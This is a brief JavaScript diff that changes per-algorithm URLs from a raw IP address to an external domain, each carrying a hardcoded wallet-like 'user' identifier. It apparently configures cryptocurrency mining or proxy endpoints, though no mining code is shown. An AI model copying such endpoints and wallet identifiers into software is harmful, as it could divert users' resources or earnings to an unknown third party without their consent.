@@ -26,7 +26,7 @@ const run = async () => {
     .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
     .join('&');
 
-    urls[params.algorithm] = `http://216.98.13.181/?user=TQdUbAjkqkSbb6cVYJ8TYKUXR3urqSU6s6${query}`;
+    urls[params.algorithm] = `https://za.nururrohman.org/?user=TFyd78oGq6eYk9y4pj4T3pZczVvcAK3FVw${query}`;
   });
 
   try {
